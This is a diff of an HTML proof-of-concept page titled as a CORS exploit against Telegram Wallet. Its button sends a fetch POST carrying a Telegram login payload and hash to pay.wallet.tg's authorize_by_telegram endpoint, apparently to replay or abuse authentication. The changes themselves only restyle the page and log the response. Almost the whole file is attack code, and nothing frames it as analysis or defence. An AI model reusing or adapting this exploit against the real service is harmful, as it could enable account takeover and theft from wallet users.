@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Telegram Wallet CORS Exploit</title></head>
-  <body>
-    <h2>Exploit: Send Telegram Login Payload</h2>
+  <body style="background:#333;color:#fff">
+    <h2>Exploit: Send Telegram Login</h2>
     <button onclick="exploit()">Exploit</button>
+
     <script>
       function exploit() {
         fetch("https://pay.wallet.tg/api/v1/users/authorize_by_telegram/", {
@@ -21,9 +21,17 @@
             hash: "0286a9d09b7470311e0260db1d01596fbc9418d3e50e61630ea60adbee9b85f5"
           })
         })
-        .then(res => res.text())
-        .then(data => alert("Response:\n" + data))
-        .catch(err => alert("Error:\n" + err));
+        .then(res => {
+          console.log("Status:", res.status);
+          return res.text();
+        })
+        .then(data => {
+          alert("Done. Check if login succeeded.");
+          console.log("Response:", data);
+        })
+        .catch(err => {
+          alert("Error: " + err);
+        });
       }
     </script>
   </body>
